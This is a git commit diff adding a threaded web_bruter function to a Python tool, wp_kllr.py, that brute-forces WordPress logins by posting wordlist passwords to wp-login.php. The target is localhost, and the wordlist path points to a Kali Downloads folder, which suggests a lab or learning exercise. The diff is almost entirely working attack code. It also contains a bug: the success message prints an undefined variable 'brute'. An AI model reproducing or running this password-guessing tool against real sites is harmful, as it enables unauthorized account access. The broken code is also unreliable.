f488ab93d60223538683743b13ade5a980b97d7a
Zauzanov <zauzanov@gmail.com>
2026-02-27 02:03:11 +0300

    Add web_bruter func

--- wp-kllr/wp_kllr.py
+++ wp-kllr/wp_kllr.py
@@ -7,7 +7,7 @@ import sys
 import threading
 import time
 
-SUCCESS = 'Welcome to WordPress!'
+SUCCESS = 'Welcome to WordPress!' 
 TARGET = "http://localhost:8080/wp-login.php"
 WORDLIST = "/home/kali/Downloads/cain-and-abel.txt" 
 
@@ -25,7 +25,7 @@ def get_params(content):
     params = dict()
     parser = etree.HTMLParser()
     tree = etree.parse(BytesIO(content), parser=parser)
-    for elem in tree.findall('//input'):
+    for elem in tree.findall('//input'):                                                # Finds all input elements.
         name = elem.get('name')
         if name is not None:
             params[name] = elem.get('value', None)
@@ -44,5 +44,23 @@ class Bruter:
             t = threading.Thread(target=self.web_bruter, args=(passwords,))
             t.start()
     
-    
-        
+    def web_bruter(self, passwords):
+        session = requests.Session()
+        resp0 = session.get(self.url)
+        params = get_params(resp0.content)
+        params['log'] = self.username
+
+        while not passwords.empty() and not self.found:
+            time.sleep(5)
+            passwd = passwords.get()
+            print(f'Trying username/password {self.username}/{passwd:<10}')
+            params['pwd'] = passwd
+
+            resp1 = session.post(self.url, data=params)
+            if SUCCESS in resp1.content.decode():
+                self.found = True
+                print(f"\nBruteforcing successful.")
+                print("Username is %s" % self.username)
+                print("Password is %s\n" % brute)
+                print('done: now cleaning up other threads...')
+
